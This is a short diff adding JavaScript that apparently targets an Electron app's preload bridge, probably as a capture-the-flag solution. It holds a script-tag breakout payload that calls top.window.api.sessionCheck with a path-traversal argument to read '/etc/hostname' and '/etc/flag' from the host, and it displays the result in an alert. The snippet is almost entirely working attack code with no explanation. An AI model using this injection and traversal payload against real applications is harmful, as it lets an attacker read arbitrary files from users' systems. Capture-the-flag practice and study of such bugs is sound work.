@@ -1,0 +1,7 @@
+ window.api.receive("reply", (data) => {
+            console.log(`Received ${data} from main process`);
+        });
+
+ window.api.sessionCheck("session",'../../../../../../etc/hostname')
+
+ </script><script>top.window.api.receive('reply',(e=>{alert(`${e}`)})); top.window.api.sessionCheck('session','../../../../../../etc/flag');</script>
